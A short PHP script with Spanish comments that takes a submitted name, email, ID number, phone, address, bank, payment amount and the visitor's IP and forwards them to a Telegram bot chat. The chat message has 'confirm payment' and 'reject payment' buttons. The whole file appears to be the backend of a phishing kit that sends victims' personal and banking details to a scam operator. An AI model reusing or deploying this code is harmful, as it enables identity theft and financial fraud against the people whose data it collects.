
<?php
session_start();
header('Content-Type: application/json');

// Configuración del bot de Telegram
$config = require 'botmaster.php';

if (!$config || !isset($config['token']) || !isset($config['chat_id'])) {
    echo json_encode(['error' => 'Configuración de Telegram inválida.']);
    exit;
}

$inputData = json_decode(file_get_contents('php://input'), true);
error_log("Datos recibidos: " . print_r($inputData, true));

$nombre = $inputData['nombre'] ?? '';
$email = $inputData['email'] ?? '';
$documento = $inputData['id'] ?? '';
$celular = $inputData['celular'] ?? '';
$direccion = $inputData['direccion'] ?? '';
$banco = $inputData['banco'] ?? '';
$monto = $inputData['monto'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'];

if (!$nombre || !$email || !$documento || !$celular || !$direccion || !$banco || !$monto) {
    echo json_encode(['status' => 'error', 'message' => 'Faltan datos obligatorios']);
    exit;
}

$mensaje = "⚠️ <b>Usuario realizando pago con QR</b>%0A";
$mensaje .= "<b>Nombre:</b> {$nombre}%0A";
$mensaje .= "<b>Email:</b> {$email}%0A";
$mensaje .= "<b>Documento:</b> {$documento}%0A";
$mensaje .= "<b>Celular:</b> {$celular}%0A";
$mensaje .= "<b>Dirección:</b> {$direccion}%0A";
$mensaje .= "<b>Monto:</b> $ {$monto}%0A";
$mensaje .= "<b>Banco:</b> {$banco}%0A";
$mensaje .= "<b>IP:</b> {$ip}";

$keyboard = [
    'inline_keyboard' => [
        [
            ['text' => '✅ Confirmar Pago', 'callback_data' => 'confirmar_pago'],
            ['text' => '❌ Rechazar Pago', 'callback_data' => 'rechazar_pago']
        ]
    ]
];

$url = "https://api.telegram.org/bot{$config['token']}/sendMessage";
$data = [
    'chat_id' => $config['chat_id'],
    'text' => $mensaje,
    'parse_mode' => 'HTML',
    'reply_markup' => json_encode($keyboard)
];

$options = [
    'http' => [
        'header'  => "Content-type: application/x-www-form-urlencoded
",
        'method'  => 'POST',
        'content' => http_build_query($data),
    ]
];
$context  = stream_context_create($options);
$result = file_get_contents($url, false, $context);

if ($result === false) {
    echo json_encode(['status' => 'error', 'message' => 'No se pudo enviar a Telegram']);
    exit;
}

echo json_encode(['status' => 'success']);
?>
